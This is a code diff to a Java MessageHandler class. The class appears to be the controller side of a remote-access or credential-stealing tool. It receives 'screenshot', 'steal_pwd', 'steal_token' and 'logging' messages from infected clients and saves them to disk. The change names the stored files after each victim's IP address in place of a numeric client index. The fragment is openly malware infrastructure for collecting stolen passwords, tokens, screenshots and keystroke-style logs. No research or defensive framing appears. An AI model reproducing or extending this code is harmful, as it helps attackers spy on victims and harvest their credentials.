@@ -28,11 +28,11 @@ public class MessageHandler {
     }
 
     @SuppressWarnings("ResultOfMethodCallIgnored")
-    public static void handle(String[] msgArr, int cIndex) {
+    public static void handle(String[] msgArr, String ip) {
         try {
             switch (msgArr[0]) {
                 case "screenshot" -> {
-                    File screenshotFile = new File("screenshots", getFileName("png", cIndex, true));
+                    File screenshotFile = new File("screenshots", getFileName("png", ip, true));
                     new File("screenshots").mkdir();
                     screenshotFile.createNewFile();
                     FileOutputStream file = new FileOutputStream(screenshotFile);
@@ -42,7 +42,7 @@ public class MessageHandler {
                 case "steal_pwd", "steal_token" ->
                         log("Message: " + msgArr[0] + " " + Arrays.toString(doStringParse(msgArr)));
                 case "logging" -> {
-                    File logFile = new File("logging", getFileName("log", cIndex, false));
+                    File logFile = new File("logging", getFileName("log", ip, false));
                     new File("logging").mkdir();
                     logFile.createNewFile();
                     FileInputStream file2In = new FileInputStream(logFile);
@@ -59,7 +59,7 @@ public class MessageHandler {
         }
     }
 
-    private static String getFileName(String suffix, int cIndex, boolean time) {
-        return "id" + cIndex + (time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "") + "." + suffix;
+    private static String getFileName(String suffix, String ip, boolean time) {
+        return "ip " + ip + (time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "") + "." + suffix;
     }
 }
